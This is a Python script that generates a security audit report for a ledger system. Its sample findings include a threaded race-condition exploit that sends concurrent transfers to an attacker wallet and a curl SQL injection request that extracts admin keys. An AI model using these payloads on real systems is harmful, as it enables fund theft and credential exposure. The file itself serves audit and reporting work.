// SPDX-License-Identifier: MIT
# SPDX-License-Identifier: MIT

import sqlite3
import json
import datetime
import hashlib
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from enum import Enum

DB_PATH = "rustchain.db"

class SeverityLevel(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"

@dataclass
class Finding:
    title: str
    severity: SeverityLevel
    category: str
    description: str
    proof_of_concept: str
    remediation: str
    affected_endpoints: List[str]
    cvss_score: float
    discovered_by: str
    timestamp: datetime.datetime

class SecurityAuditReportGenerator:
    def __init__(self):
        self.findings = []
        self.report_id = None
        self.generated_at = None

    def add_finding(self, finding: Finding):
        """Add a security finding to the report"""
        self.findings.append(finding)

    def calculate_risk_score(self, findings: List[Finding]) -> float:
        """Calculate overall risk score based on findings"""
        if not findings:
            return 0.0

        severity_weights = {
            SeverityLevel.CRITICAL: 10.0,
            SeverityLevel.HIGH: 7.5,
            SeverityLevel.MEDIUM: 5.0,
            SeverityLevel.LOW: 2.5,
            SeverityLevel.INFO: 1.0
        }

        total_score = sum(severity_weights[f.severity] for f in findings)
        return min(total_score / len(findings), 10.0)

    def generate_executive_summary(self, findings: List[Finding]) -> str:
        """Generate executive summary of security assessment"""
        critical_count = sum(1 for f in findings if f.severity == SeverityLevel.CRITICAL)
        high_count = sum(1 for f in findings if f.severity == SeverityLevel.HIGH)
        medium_count = sum(1 for f in findings if f.severity == SeverityLevel.MEDIUM)
        low_count = sum(1 for f in findings if f.severity == SeverityLevel.LOW)

        risk_score = self.calculate_risk_score(findings)

        summary = f"""
EXECUTIVE SUMMARY

A comprehensive security audit of the Rustchain ledger system was conducted, focusing on
balance manipulation vectors, authentication mechanisms, and ledger integrity controls.

FINDINGS OVERVIEW:
- Critical: {critical_count}
- High: {high_count}
- Medium: {medium_count}
- Low: {low_count}

OVERALL RISK SCORE: {risk_score:.1f}/10.0

The assessment identified several areas of concern including potential race conditions
in the pending ledger system, insufficient input validation on transfer endpoints,
and opportunities for balance manipulation through API abuse.
        """
        return summary.strip()

    def format_finding_details(self, finding: Finding) -> str:
        """Format individual finding with full details"""
        return f"""
{'='*80}
FINDING: {finding.title}
{'='*80}

Severity: {finding.severity.value} (CVSS: {finding.cvss_score})
Category: {finding.category}
Discovered by: {finding.discovered_by}
Date: {finding.timestamp.strftime('%Y-%m-%d %H:%M:%S')}

DESCRIPTION:
{finding.description}

AFFECTED ENDPOINTS:
{chr(10).join(f"- {endpoint}" for endpoint in finding.affected_endpoints)}

PROOF OF CONCEPT:
{finding.proof_of_concept}

REMEDIATION:
{finding.remediation}
        """

    def save_report_to_db(self, report_content: str) -> str:
        """Save generated report to database"""
        report_id = hashlib.sha256(f"{datetime.datetime.now().isoformat()}{report_content}".encode()).hexdigest()[:16]

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS audit_reports (
                    report_id TEXT PRIMARY KEY,
                    generated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    findings_count INTEGER,
                    risk_score REAL,
                    report_content TEXT,
                    status TEXT DEFAULT 'draft'
                )
            """)

            conn.execute("""
                INSERT INTO audit_reports
                (report_id, findings_count, risk_score, report_content)
                VALUES (?, ?, ?, ?)
            """, (report_id, len(self.findings), self.calculate_risk_score(self.findings), report_content))

            conn.commit()

        return report_id

    def generate_report(self) -> str:
        """Generate complete security audit report"""
        self.generated_at = datetime.datetime.now()
        self.report_id = hashlib.sha256(f"{self.generated_at.isoformat()}".encode()).hexdigest()[:12]

        # Sort findings by severity
        severity_order = {
            SeverityLevel.CRITICAL: 0,
            SeverityLevel.HIGH: 1,
            SeverityLevel.MEDIUM: 2,
            SeverityLevel.LOW: 3,
            SeverityLevel.INFO: 4
        }
        sorted_findings = sorted(self.findings, key=lambda x: severity_order[x.severity])

        report_sections = []

        # Header
        report_sections.append(f"""
RUSTCHAIN SECURITY AUDIT REPORT
Report ID: {self.report_id}
Generated: {self.generated_at.strftime('%Y-%m-%d %H:%M:%S UTC')}
Target: Rustchain Ledger System v2.2.1
Scope: Balance manipulation, ledger integrity, API security
        """.strip())

        # Executive Summary
        report_sections.append(self.generate_executive_summary(sorted_findings))

        # Detailed Findings
        report_sections.append("\nDETAILED FINDINGS")
        report_sections.append("="*80)

        for finding in sorted_findings:
            report_sections.append(self.format_finding_details(finding))

        # Recommendations
        report_sections.append(f"""
{'='*80}
SECURITY RECOMMENDATIONS
{'='*80}

1. Implement comprehensive input validation on all transfer endpoints
2. Add rate limiting to prevent automated balance manipulation attacks
3. Enhance the pending ledger system with atomic transactions
4. Implement proper authentication token rotation
5. Add comprehensive audit logging for all balance-affecting operations
6. Deploy automated security monitoring for suspicious transaction patterns
        """)

        full_report = "\n".join(report_sections)

        # Save to database
        saved_id = self.save_report_to_db(full_report)

        return full_report

def create_sample_findings():
    """Create sample findings for testing"""
    findings = []

    # Critical finding - race condition
    findings.append(Finding(
        title="Race Condition in Pending Ledger System",
        severity=SeverityLevel.CRITICAL,
        category="Business Logic",
        description="The 2-phase commit system for balance updates contains a race condition where concurrent requests can bypass pending ledger validation, allowing unauthorized balance manipulation.",
        proof_of_concept="""
import requests
import threading

def exploit_race():
    session = requests.Session()
    # Login
    session.post('/login', json={'username': 'victim', 'password': 'pass'})

    # Concurrent transfer requests
    def transfer():
        session.post('/wallet/transfer', json={
            'to_address': 'attacker_wallet',
            'amount': 1000000
        })

    threads = [threading.Thread(target=transfer) for _ in range(10)]
    for t in threads:
        t.start()
        """,
        remediation="Implement proper database-level locks and use SELECT FOR UPDATE in balance checking queries. Consider implementing optimistic concurrency control.",
        affected_endpoints=["/wallet/transfer", "/api/balance"],
        cvss_score=9.1,
        discovered_by="Security Researcher",
        timestamp=datetime.datetime.now()
    ))

    # High finding - SQL injection
    findings.append(Finding(
        title="SQL Injection in Balance Query Endpoint",
        severity=SeverityLevel.HIGH,
        category="Injection",
        description="The balance query endpoint does not properly sanitize user input, allowing SQL injection attacks to extract sensitive database information.",
        proof_of_concept="""
# Exploit via balance query
curl -X GET "http://localhost:5000/api/balance/user?id=1' UNION SELECT admin_key FROM users WHERE role='admin'--"

# This returns admin private keys in the balance response
        """,
        remediation="Use parameterized queries for all database operations. Implement input validation and sanitization.",
        affected_endpoints=["/api/balance", "/wallet/history"],
        cvss_score=8.2,
        discovered_by="Red Team Alpha",
        timestamp=datetime.datetime.now()
    ))

    return findings

def generate_test_report():
    """Generate a test security report"""
    generator = SecurityAuditReportGenerator()

    sample_findings = create_sample_findings()
    for finding in sample_findings:
        generator.add_finding(finding)

    return generator.generate_report()

if __name__ == "__main__":
    report = generate_test_report()
    print(report)
